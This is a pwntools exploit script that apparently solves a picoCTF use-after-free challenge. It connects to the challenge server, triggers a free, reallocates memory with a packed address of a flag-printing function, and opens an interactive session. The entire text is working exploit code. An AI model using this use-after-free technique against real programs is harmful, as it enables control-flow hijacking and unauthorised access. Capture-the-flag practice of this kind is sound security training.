from pwn import *


'''
    --- UAF vulnerability ---
'''
# details
HOST = "mercury.picoctf.net"
PORT = 4504

context.binary = './vuln'
#context.log_level = 'debug'

r = remote(HOST, PORT)
#r = process(["./vuln"])
r.recv()  # skip the menu text

flag_func = p64(0x80487d6)

# sending first option
r.sendline(b"i")
r.recvuntil(b"?\n")
r.sendline(b"y")

# sending second option
r.sendline(b"l")
r.recvuntil(b":\n")
r.sendline(flag_func)

# see the flag and submit
r.interactive()

